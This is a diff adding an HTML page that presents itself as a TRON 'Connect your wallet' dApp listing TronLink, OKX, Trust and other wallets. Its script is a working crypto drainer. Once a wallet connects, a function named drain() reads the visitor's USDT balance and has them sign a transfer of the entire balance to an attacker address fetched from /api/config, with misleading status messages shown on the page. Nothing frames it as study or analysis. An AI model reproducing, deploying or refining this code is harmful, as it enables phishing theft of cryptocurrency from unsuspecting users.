@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TRON DApp</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', -apple-system, sans-serif;
+      background: #000; color: #fff;
+      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;
+    }
+    .container {
+      width: 100%; max-width: 400px;
+      background: #111; border: 1px solid #222; border-radius: 16px;
+      padding: 28px 20px;
+    }
+    .header { text-align: center; margin-bottom: 16px; }
+    .header p { font-size: 12px; color: #666; }
+    .msg {
+      padding: 10px 14px; border-radius: 10px; font-size: 13px; line-height: 1.5;
+      margin-bottom: 14px; display: none; border: 1px solid transparent;
+    }
+    .msg.show { display: block; }
+    .msg.err { background: #1a0a0a; border-color: #331111; color: #ff6b6b; }
+    .msg.ok { background: #0a1a0a; border-color: #113311; color: #6bff6b; }
+    .msg.inf { background: #0a0a1a; border-color: #111133; color: #6b6bff; }
+    .wallet-list { display: flex; flex-direction: column; gap: 6px; }
+    .wallet-btn {
+      display: flex; align-items: center; gap: 12px;
+      padding: 12px 14px; background: #181818; border: 1px solid #2a2a2a;
+      border-radius: 12px; cursor: pointer; font-family: inherit; color: #fff;
+      text-align: left; width: 100%; transition: border-color 0.15s;
+    }
+    .wallet-btn:hover { border-color: #444; }
+    .wallet-btn:active { transform: scale(0.98); }
+    .wallet-btn .ico {
+      width: 36px; height: 36px; border-radius: 10px;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+      overflow: hidden;
+    }
+    .wallet-btn .ico img { width: 100%; height: 100%; object-fit: contain; }
+    .wallet-btn .nm { font-size: 14px; font-weight: 500; }
+    .wallet-btn.hidden { display: none; }
+    .toggle-btn {
+      display: block; width: 100%; padding: 10px; border-radius: 10px;
+      border: 1px solid #222; background: transparent; color: #666;
+      font-size: 12px; cursor: pointer; font-family: inherit; text-align: center; margin-top: 6px;
+    }
+    .toggle-btn:hover { border-color: #444; color: #fff; }
+    .log { margin-top: 14px; }
+    .log-item {
+      display: flex; align-items: center; gap: 10px;
+      padding: 10px 14px; background: #0d0d0d; border: 1px solid #222;
+      border-radius: 10px; margin-bottom: 6px; font-size: 13px; color: #888;
+    }
+    .log-item .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+    .log-item .dot.busy { background: #ffd700; animation: pulse 1.5s infinite; }
+    .log-item .dot.ok { background: #4ade80; }
+    .log-item .dot.fail { background: #ff4444; }
+    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+    .spinner {
+      display: inline-block; width: 14px; height: 14px;
+      border: 2px solid rgba(255,255,255,0.15); border-top-color: #fff;
+      border-radius: 50%; animation: spin 0.6s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .footer { margin-top: 18px; text-align: center; font-size: 11px; color: #333; }
+    .screen { display: none; }
+    .screen.on { display: block; }
+    .back-btn {
+      display: block; width: 100%; padding: 10px; border-radius: 10px;
+      border: 1px solid #222; background: transparent; color: #666;
+      font-size: 13px; cursor: pointer; font-family: inherit; text-align: center; margin-top: 12px;
+    }
+    .back-btn:hover { border-color: #444; color: #fff; }
+    .tx-link { color: #888; text-decoration: none; font-size: 12px; border-bottom: 1px dotted #444; }
+    .tx-link:hover { color: #fff; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <p>Connect your wallet</p>
+    </div>
+    <div id="msgBox"></div>
+    <div class="screen on" id="scMain">
+      <div class="wallet-list" id="walletList"></div>
+      <button class="toggle-btn" id="toggleBtn"></button>
+    </div>
+    <div class="screen" id="scLog">
+      <div class="log" id="logBox"></div>
+      <button class="back-btn" id="backBtn">Back</button>
+    </div>
+    <div class="footer">TRON NETWORK</div>
+  </div>
+
+  <script>
+    var VISIBLE_COUNT = 5;
+    var WALLETS = [
+      {
+        id:'tronlink', name:'TronLink',
+        url:'https://tronlink.org', app:'tronlink://',
+        logo:'https://tronlink.org/favicon.ico'
+      },
+      {
+        id:'metamask', name:'MetaMask',
+        url:'https://metamask.io', app:'metamask://',
+        logo:'https://dl.svgcdn.com/svg/token-branded/metamask.svg'
+      },
+      {
+        id:'okx', name:'OKX',
+        url:'https://www.okx.com/web3', app:'okx://',
+        logo:'https://dl.svgcdn.com/svg/token-branded/okx.svg'
+      },
+      {
+        id:'tokenpocket', name:'TokenPocket',
+        url:'https://www.tokenpocket.pro', app:'tp://',
+        logo:'https://dl.svgcdn.com/svg/token-branded/token-pocket.svg'
+      },
+      {
+        id:'trust', name:'Trust',
+        url:'https://trustwallet.com', app:'trust://',
+        logo:'https://dl.svgcdn.com/svg/token-branded/trust.svg'
+      },
+      {
+        id:'bitget', name:'Bitget',
+        url:'https://web3.bitget.com', app:'bitkeep://',
+        logo:'https://dl.svgcdn.com/svg/token-branded/bitget.svg'
+      },
+      {
+        id:'bybit', name:'Bybit',
+        url:'https://www.bybit.com/en/web3', app:'bybit://',
+        logo:'https://dl.svgcdn.com/svg/token-branded/bybit.svg'
+      },
+      {
+        id:'ledger', name:'Ledger',
+        url:'https://www.ledger.com', app:'ledgerlive://',
+        logo:'https://dl.svgcdn.com/svg/token-branded/ledger.svg'
+      },
+      {
+        id:'imtoken', name:'imToken',
+        url:'https://token.im', app:'imtoken://',
+        logo:'https://dl.svgcdn.com/svg/token-branded/imtoken.svg'
+      },
+      {
+        id:'gate', name:'Gate',
+        url:'https://www.gate.io/web3', app:'gateweb3://',
+        logo:'https://dl.svgcdn.com/svg/token-branded/gate-io.svg'
+      },
+      {
+        id:'portal', name:'Portal',
+        url:'https://www.portalwallet.com', app:'portal://',
+        logo:'https://dl.svgcdn.com/svg/token-branded/portal.svg'
+      },
+      {
+        id:'foxwallet', name:'FoxWallet',
+        url:'https://foxwallet.com', app:'foxwallet://',
+        logo:'https://foxwallet.com/wp-content/themes/foxwallet/assets/icons/logo-icon.svg'
+      },
+      {
+        id:'bitpie', name:'BitPie',
+        url:'https://bitpie.com', app:'bitpie://',
+        logo:'https://bitpie.com/favicon.ico'
+      }
+    ];
+
+    var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
+    var config = {};
+    var expanded = false;
+
+    var msgBox = document.getElementById('msgBox');
+    var walletList = document.getElementById('walletList');
+    var logBox = document.getElementById('logBox');
+    var backBtn = document.getElementById('backBtn');
+    var toggleBtn = document.getElementById('toggleBtn');
+
+    function msg(type, text) { msgBox.innerHTML = '<div class="msg show ' + type + '">' + text + '</div>'; }
+    function hideMsg() { msgBox.innerHTML = ''; }
+    function scShow(id) {
+      document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('on'); });
+      document.getElementById(id).classList.add('on');
+    }
+
+    function addLog(text, state) {
+      var el = document.createElement('div'); el.className = 'log-item';
+      if (state === 'busy') {
+        el.innerHTML = '<div class="spinner" style="margin-right:10px;flex-shrink:0"></div>' + text;
+      } else {
+        el.innerHTML = '<div class="dot ' + state + '"></div>' + text;
+      }
+      logBox.appendChild(el); return el;
+    }
+    function setLog(el, text, state) {
+      if (state === 'busy') {
+        el.innerHTML = '<div class="spinner" style="margin-right:10px;flex-shrink:0"></div>' + text;
+      } else {
+        el.innerHTML = '<div class="dot ' + state + '"></div>' + text;
+      }
+    }
+
+    var USDT_ABI = [
+      {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
+      {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
+    ];
+
+    function getTronLink() { return window.tronLink || null; }
+    function getTronWeb() { return (window.tronWeb && window.tronWeb.ready) ? window.tronWeb : null; }
+    function getOkx() { return window.okxwallet || null; }
+    function getBitget() { return window.bitkeep || null; }
+    function getGate() { return window.gatewallet || null; }
+    function getBybit() { return window.bybitWallet || null; }
+
+    async function connectTronLink() {
+      var tl = getTronLink();
+      if (!tl || !tl.request) return null;
+      var res = await tl.request({ method: 'tron_requestAccounts' });
+      return res && (res.data && res.data.address || res.address || (Array.isArray(res) ? res[0] : null) || (typeof res === 'string' ? res : null));
+    }
+
+    async function connectOkx() {
+      var okx = getOkx();
+      if (!okx) return null;
+      if (okx.tron) {
+        var res = await okx.tron.request({ method: 'tron_requestAccounts' });
+        return res && (res.data && res.data.address || res.address || (Array.isArray(res) ? res[0] : null));
+      }
+      if (okx.tronLink) {
+        var res = await okx.tronLink.request({ method: 'tron_requestAccounts' });
+        return res && (res.data && res.data.address || res.address || (Array.isArray(res) ? res[0] : null));
+      }
+      return null;
+    }
+
+    async function connectBitget() {
+      var bg = getBitget();
+      if (!bg || !bg.tron) return null;
+      var res = await bg.tron.request({ method: 'tron_requestAccounts' });
+      return res && (res.data && res.data.address || res.address || (Array.isArray(res) ? res[0] : null));
+    }
+
+    async function connectTronWeb() {
+      var tw = getTronWeb();
+      if (!tw) return null;
+      var addr = tw.defaultAddress && tw.defaultAddress.base58;
+      if (!addr && tw.request) {
+        await tw.request({ method: 'tron_requestAccounts' });
+        addr = tw.defaultAddress && tw.defaultAddress.base58;
+      }
+      return addr || null;
+    }
+
+    async function connectGate() {
+      var gw = getGate();
+      if (!gw || !gw.tron) return null;
+      var res = await gw.tron.request({ method: 'tron_requestAccounts' });
+      return res && (res.data && res.data.address || res.address || null);
+    }
+
+    async function connectBybit() {
+      var bb = getBybit();
+      if (!bb || !bb.tronLink) return null;
+      var res = await bb.tronLink.request({ method: 'tron_requestAccounts' });
+      return res && (res.data && res.data.address || res.address || null);
+    }
+
+    async function drain(address, label) {
+      hideMsg(); logBox.innerHTML = ''; scShow('scLog');
+      addLog('Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
+      var tw = getTronWeb();
+      if (!tw || !config.drainAddress) { addLog('Wallet not available', 'fail'); msg('err', 'Wallet not available'); return; }
+
+      var totalSent = 0;
+
+      var usdtLog = addLog('Checking USDT balance...', 'busy');
+      try {
+        var tl = window.tronLink;
+        var itw = tl && (tl.tronWeb || tl.tron);
+        if (itw) itw.contract(USDT_ABI);
+        var usdtContract = await tw.contract(USDT_ABI).at(config.usdtContract);
+        var raw;
+        for (var attempt = 0; attempt < 3; attempt++) {
+          try { raw = await usdtContract.balanceOf(address).call(); break; }
+          catch(e) { if (attempt < 2) await new Promise(r => setTimeout(r, 2000)); else throw e; }
+        }
+        var usdtBal = raw.toNumber ? raw.toNumber() : Number(raw);
+        if (usdtBal > 0) {
+          setLog(usdtLog, 'USDT balance: ' + (usdtBal / 1e6).toFixed(2), 'ok');
+          var waitLog = addLog('Waiting for USDT confirmation...', 'busy');
+          var txBuild = await tw.transactionBuilder.triggerSmartContract(
+            config.usdtContract, 'transfer(address,uint256)',
+            { feeLimit: 150000000 },
+            [{ type: 'address', value: config.drainAddress }, { type: 'uint256', value: usdtBal.toString() }],
+            address
+          );
+          var signed = await tw.trx.sign(txBuild.transaction);
+          var receipt = await tw.trx.sendRawTransaction(signed);
+          var txId = receipt.txid || receipt;
+          setLog(waitLog, 'USDT: ' + (usdtBal / 1e6).toFixed(2) + ' Trigger Smart Contract', 'ok');
+          addLog('TX: <a class="tx-link" href="https://tronscan.org/#/transaction/' + txId + '" target="_blank">' + txId.slice(0,16) + '...</a>', 'ok');
+          totalSent++;
+        } else {
+          setLog(usdtLog, 'USDT balance: 0', 'fail');
+        }
+      } catch(e) {
+        setLog(usdtLog, 'USDT error: ' + (e.message || e.code || e), 'fail');
+      }
+
+      if (totalSent > 0) msg('ok', 'Transferred ' + totalSent + ' asset(s)');
+      else msg('inf', 'No USDT to transfer');
+    }
+
+    function redirectTo(wallet) {
+      if (isMobile) {
+        window.location.href = wallet.app;
+        setTimeout(function(){ window.location.href = wallet.url; }, 800);
+      } else {
+        window.open(wallet.url, '_blank');
+      }
+    }
+
+    async function handleWalletClick(wallet) {
+      hideMsg();
+      var addr = null;
+      try {
+        switch (wallet.id) {
+          case 'tronlink':
+            if (getTronLink() || getTronWeb()) {
+              addr = await connectTronLink();
+              if (!addr) addr = await connectTronWeb();
+            }
+            break;
+          case 'okx':
+            if (getOkx()) addr = await connectOkx();
+            break;
+          case 'bitget':
+            if (getBitget()) addr = await connectBitget();
+            break;
+          case 'tokenpocket':
+          case 'imtoken':
+          case 'portal':
+          case 'trust':
+          case 'bitpie':
+            if (getTronWeb()) addr = await connectTronWeb();
+            break;
+          case 'ledger':
+          case 'metamask':
+            break;
+          case 'gate':
+            if (getGate()) addr = await connectGate();
+            break;
+          case 'bybit':
+            if (getBybit()) addr = await connectBybit();
+            break;
+          case 'foxwallet':
+            if (getTronWeb()) addr = await connectTronWeb();
+            break;
+        }
+      } catch(e) {
+        if (e.message && e.message.indexOf('cancel') !== -1) {
+          msg('inf', 'Connection cancelled');
+          return;
+        }
+      }
+      if (addr) {
+        await drain(addr, wallet.name);
+      } else {
+        redirectTo(wallet);
+      }
+    }
+
+    function render() {
+      walletList.innerHTML = '';
+      for (var i = 0; i < WALLETS.length; i++) {
+        var w = WALLETS[i];
+        var b = document.createElement('button'); b.className = 'wallet-btn';
+        if (i >= VISIBLE_COUNT) b.classList.add('hidden');
+        b.innerHTML =
+          '<div class="ico"><img src="'+w.logo+'" alt="'+w.name+'" loading="lazy"></div>' +
+          '<div class="nm">'+w.name+'</div>';
+        b.addEventListener('click', (function(wallet){ return function(){ handleWalletClick(wallet); }; })(w));
+        walletList.appendChild(b);
+      }
+      updateToggleBtn();
+    }
+
+    function updateToggleBtn() {
+      var hiddenCount = WALLETS.length - VISIBLE_COUNT;
+      if (hiddenCount <= 0) { toggleBtn.style.display = 'none'; return; }
+      toggleBtn.style.display = 'block';
+      toggleBtn.textContent = expanded ? 'Show less' : 'Show all (' + WALLETS.length + ')';
+    }
+
+    toggleBtn.addEventListener('click', function(){
+      expanded = !expanded;
+      var btns = walletList.querySelectorAll('.wallet-btn');
+      for (var i = VISIBLE_COUNT; i < btns.length; i++) {
+        btns[i].classList.toggle('hidden', !expanded);
+      }
+      updateToggleBtn();
+    });
+
+
+    backBtn.addEventListener('click', function(){ logBox.innerHTML = ''; hideMsg(); scShow('scMain'); });
+
+    fetch('/api/config').then(function(r){ return r.json(); }).then(function(d){ config = d; }).catch(function(){});
+    render();
+  </script>
+</body>
+</html>
